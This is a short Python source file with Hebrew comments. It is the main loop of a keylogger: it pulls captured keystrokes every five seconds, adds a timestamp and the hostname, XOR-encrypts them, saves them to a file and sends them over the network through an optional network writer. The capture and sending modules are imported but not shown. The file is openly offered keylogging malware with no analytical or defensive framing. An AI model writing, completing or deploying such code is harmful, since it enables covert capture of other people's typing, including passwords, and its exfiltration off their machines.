import time
import socket
from logger import KeyLoggerService
from writer import FileWriter
from sender import NetworkWriter  # אופציונלי
from encryptor import Encryptor  # קובץ חדש להצפנה, ראה למטה

def main():
    service = KeyLoggerService()
    writer = FileWriter()
    sender = NetworkWriter()  # ניתן להסיר אם לא רוצים שליחה רשתית
    encryptor = Encryptor(key=42)  # מפתח XOR לדוגמה

    hostname = socket.gethostname()
    buffer = []

    service.start_logging()
    print("📡 התחלת איסוף הקשות...")

    try:
        while True:
            time.sleep(5)  # כל 5 שניות
            keys = service.get_logged_keys()
            if keys:
                buffer.extend(keys)

            if len(buffer) > 0:  # שמירה תקופתית
                data = ''.join(buffer)
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                to_encrypt = f"[{timestamp}] {data}"
                encrypted = encryptor.encrypt(to_encrypt)

                writer.send_data(encrypted, hostname)
                sender.send_data(encrypted, hostname)  # אופציונלי

                buffer = []

    except KeyboardInterrupt:
        service.stop_logging()
        if buffer:
            data = ''.join(buffer)
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            to_encrypt = f"[{timestamp}] {data}"
            encrypted = encryptor.encrypt(to_encrypt)
            writer.send_data(encrypted, hostname)
            sender.send_data(encrypted, hostname)

if __name__ == "__main__":
    main()